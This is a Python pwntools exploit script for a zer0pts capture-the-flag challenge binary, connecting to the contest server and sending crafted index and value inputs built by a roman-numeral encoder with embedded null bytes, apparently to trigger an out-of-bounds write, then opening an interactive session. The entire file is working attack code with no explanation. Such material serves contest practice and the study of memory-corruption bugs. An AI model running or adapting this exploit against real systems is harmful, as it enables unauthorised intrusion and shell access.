#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn1.ctf.zer0pts.com', 9000
binary = './chall'
brkpts = '''
'''

elf = ELF("chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def getRoman(number):
    out = ""
    cnt = 0
    while number >= 10000 and cnt < 9:
        out += "\x00"
        number -= 10000
        cnt += 1
    cnt = 0
    while number >= 1000 and cnt < 9:
        out += "M"
        number -= 1000
        cnt += 1
    cnt = 0
    while number >= 100 and cnt < 9:
        out += "C"
        number -= 100
        cnt += 1
    cnt = 0
    while number >= 10 and cnt < 9:
        out += "X"
        number -= 10
        cnt += 1
    cnt = 0
    while number >= 1 and cnt < 9:
        out += "I"
        number -= 1
        cnt += 1
    return out

if __name__ == "__main__":

    sla("ind: ", getRoman(0xfe8c))
    sla("val: ", getRoman(0x12f6))
    io.interactive()
